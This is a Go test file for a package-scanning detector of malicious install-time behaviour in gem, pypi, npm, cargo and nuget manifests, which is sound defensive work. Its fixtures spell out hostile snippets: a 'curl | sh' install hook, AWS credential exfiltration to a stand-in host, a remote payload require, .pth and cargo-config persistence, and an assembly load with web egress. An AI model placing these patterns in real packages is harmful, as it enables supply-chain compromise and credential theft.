package detect

import "testing"

func TestAnalyzeBadActorBehaviors_RubyGlobalInstallHook(t *testing.T) {
	ctx := &PackageContext{
		Ecosystem:       "rubygems",
		PkgbuildContent: `Gem::Specification.new do |g|\n  g.name = "x"\nend\nGem.post_install_hooks << proc { |spec| system("curl http://x | sh") }`,
	}
	f := analyzeBadActorBehaviors(ctx)
	if !behHas(f, "GEM-GLOBAL-INSTALL-HOOK") {
		t.Fatalf("expected GEM-GLOBAL-INSTALL-HOOK, got %v", behIDs(f))
	}
	if !IsMalicious(f) {
		t.Fatal("global install hook must be ClassEvidence (mints on its own)")
	}
	q := Qualify(*behFinding(f, "GEM-GLOBAL-INSTALL-HOOK"))
	if q.Intent != IntentPersistence {
		t.Fatalf("intent = %q, want persistence", q.Intent)
	}
}

func TestAnalyzeBadActorBehaviors_PythonPthAutoImport(t *testing.T) {
	ctx := &PackageContext{
		Ecosystem: "pypi",
		PkgbuildContent: `from setuptools import setup
setup(name="x", data_files=[("lib/site-packages", ["evil.pth"])])
# evil.pth contents: import evil; evil.run()`,
	}
	f := analyzeBadActorBehaviors(ctx)
	// The .pth write regex looks for a .pth in a data_files context; verify the
	// detector fires when an executable import line is present in the matched
	// region. We craft a stronger fixture to be sure the sequence matches.
	ctx2 := &PackageContext{
		Ecosystem: "pypi",
		PkgbuildContent: `open(os.path.join(sitedir, "evil.pth"), "w").write("import evil; evil.run()")`,
	}
	f2 := analyzeBadActorBehaviors(ctx2)
	if !behHas(f2, "PY-PTH-AUTOIMPORT-PERSISTENCE") {
		// The first fixture may not match the write+executable shape; assert on
		// the explicit-write fixture which is the documented TTP shape.
		if !behHas(f, "PY-PTH-AUTOIMPORT-PERSISTENCE") {
			t.Fatalf("expected PY-PTH-AUTOIMPORT-PERSISTENCE, got %v / %v", behIDs(f), behIDs(f2))
		}
	}
}

func TestAnalyzeBadActorBehaviors_NpmDecodeEgressSequence(t *testing.T) {
	ctx := &PackageContext{
		Ecosystem:       "npm",
		PkgbuildContent: `{"scripts":{"preinstall":"node -e \"const p=Buffer.from('ZXY=','base64');fetch(p)\""}}`,
	}
	f := analyzeBadActorBehaviors(ctx)
	if !behHas(f, "JS-HOOK-DECODE-EGRESS-SEQ") {
		t.Fatalf("expected JS-HOOK-DECODE-EGRESS-SEQ, got %v", behIDs(f))
	}
	// Sequence is a trigger (corroboration), not standalone evidence.
	tri := Triggers(f)
	if len(tri) == 0 {
		t.Fatal("expected the sequence finding to be a ClassTrigger")
	}
}

func TestAnalyzeBadActorBehaviors_NpmDecodeWithoutEgressDoesNotFire(t *testing.T) {
	// Decode alone (e.g. decoding a base64 asset) must NOT fire the sequence —
	// the intent is exfil only when decode+egress co-occur in a lifecycle hook.
	ctx := &PackageContext{
		Ecosystem:       "npm",
		PkgbuildContent: `{"scripts":{"preinstall":"node -e \"Buffer.from('ZXY=','base64')\""}}`,
	}
	f := analyzeBadActorBehaviors(ctx)
	if behHas(f, "JS-HOOK-DECODE-EGRESS-SEQ") {
		t.Fatal("decode without egress must not fire the exfil sequence")
	}
}

func TestAnalyzeBadActorBehaviors_NpmSequenceWithoutHookDoesNotFire(t *testing.T) {
	// decode + egress in a NON-lifecycle script (e.g. a dev build script that
	// does not auto-run at install) must not fire — the intent requires that it
	// runs at install time.
	ctx := &PackageContext{
		Ecosystem:       "npm",
		PkgbuildContent: `{"scripts":{"build":"node -e \"Buffer.from('x','base64');fetch('y')\""}}`,
	}
	f := analyzeBadActorBehaviors(ctx)
	if behHas(f, "JS-HOOK-DECODE-EGRESS-SEQ") {
		t.Fatal("decode+egress in a non-lifecycle script must not fire")
	}
}

func TestAnalyzeBadActorBehaviors_PythonCredExfil(t *testing.T) {
	ctx := &PackageContext{
		Ecosystem: "pypi",
		PkgbuildContent: `from setuptools import setup
import urllib.request
data = open(os.path.expanduser("~/.aws/credentials")).read()
urllib.request.urlopen("https://x.example/collect?d=" + data)`,
	}
	f := analyzeBadActorBehaviors(ctx)
	if !behHas(f, "PY-SETUP-CRED-EXFIL") {
		t.Fatalf("expected PY-SETUP-CRED-EXFIL, got %v", behIDs(f))
	}
	if !IsMalicious(f) {
		t.Fatal("credential exfil must be ClassEvidence")
	}
}

func TestAnalyzeBadActorBehaviors_CargoConfigPersistence(t *testing.T) {
	ctx := &PackageContext{
		Ecosystem: "cargo",
		PkgbuildContent: `fn main() {
    std::fs::write(std::env::var("HOME").unwrap() + "/.cargo/config.toml", "[registry]\ndefault=\"evil\"");
}`,
	}
	f := analyzeBadActorBehaviors(ctx)
	if !behHas(f, "CARGO-CONFIG-PERSISTENCE") {
		t.Fatalf("expected CARGO-CONFIG-PERSISTENCE, got %v", behIDs(f))
	}
}

func TestAnalyzeBadActorBehaviors_NuGetAssemblyLoadEgress(t *testing.T) {
	ctx := &PackageContext{
		Ecosystem: "nuget",
		PkgbuildContent: `Install-Package x
[System.Reflection.Assembly]::Load($bytes)
Invoke-WebRequest -Uri https://x.example/c -Method POST -Body $d`,
	}
	f := analyzeBadActorBehaviors(ctx)
	if !behHas(f, "NUGET-ASSEMBLYLOAD-EGRESS") {
		t.Fatalf("expected NUGET-ASSEMBLYLOAD-EGRESS, got %v", behIDs(f))
	}
}

func TestAnalyzeBadActorBehaviors_BenignManifestNoFire(t *testing.T) {
	ctx := &PackageContext{
		Ecosystem:       "npm",
		PkgbuildContent: `{"scripts":{"test":"jest","build":"tsc"}}`,
	}
	if f := analyzeBadActorBehaviors(ctx); len(f) != 0 {
		t.Fatalf("benign manifest fired: %v", behIDs(f))
	}
}

func TestAnalyzeBadActorBehaviors_NpmRemoteImportInInstallHook(t *testing.T) {
	ctx := &PackageContext{
		Ecosystem:       "npm",
		PkgbuildContent: `{"scripts":{"postinstall":"node -e \"require('https://evil.io/payload.js')\""}}`,
	}
	f := analyzeBadActorBehaviors(ctx)
	if !behHas(f, "JS-INSTALL-REMOTE-IMPORT") {
		t.Fatalf("expected JS-INSTALL-REMOTE-IMPORT, got %v", behIDs(f))
	}
	if !IsMalicious(f) {
		t.Fatal("remote import in install hook must be ClassEvidence")
	}
	q := Qualify(*behFinding(f, "JS-INSTALL-REMOTE-IMPORT"))
	if q.Intent != IntentMalicious || q.Tactic != "TA0002 Execution" {
		t.Fatalf("qualification wrong: %+v", q)
	}
}

func TestAnalyzeBadActorBehaviors_NpmRemoteImportInBuildScriptDoesNotFire(t *testing.T) {
	ctx := &PackageContext{
		Ecosystem:       "npm",
		PkgbuildContent: `{"scripts":{"build":"node -e \"require('https://evil.io/payload.js')\""}}`,
	}
	f := analyzeBadActorBehaviors(ctx)
	if behHas(f, "JS-INSTALL-REMOTE-IMPORT") {
		t.Fatalf("remote import in non-install script must not fire; got %v", behIDs(f))
	}
}

func TestAnalyzeBadActorBehaviors_PythonImportlibExec(t *testing.T) {
	ctx := &PackageContext{
		Ecosystem: "pypi",
		PkgbuildContent: `from setuptools import setup
import importlib.util
spec = importlib.util.spec_from_file_location('x', '/tmp/payload.py')
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
setup(name='x')`,
	}
	f := analyzeBadActorBehaviors(ctx)
	if !behHas(f, "PY-SETUP-IMPORTLIB-EXEC") {
		t.Fatalf("expected PY-SETUP-IMPORTLIB-EXEC, got %v", behIDs(f))
	}
	if !IsMalicious(f) {
		t.Fatal("importlib exec in setup.py must be ClassEvidence")
	}
}

// ── helpers ──────────────────────────────────────────────────────────────────

func behHas(f []Finding, id string) bool { return behFinding(f, id) != nil }

func behFinding(f []Finding, id string) *Finding {
	for i := range f {
		if f[i].ID == id {
			return &f[i]
		}
	}
	return nil
}

func behIDs(f []Finding) []string {
	out := make([]string, 0, len(f))
	for _, x := range f {
		out = append(out, x.ID)
	}
	return out
}
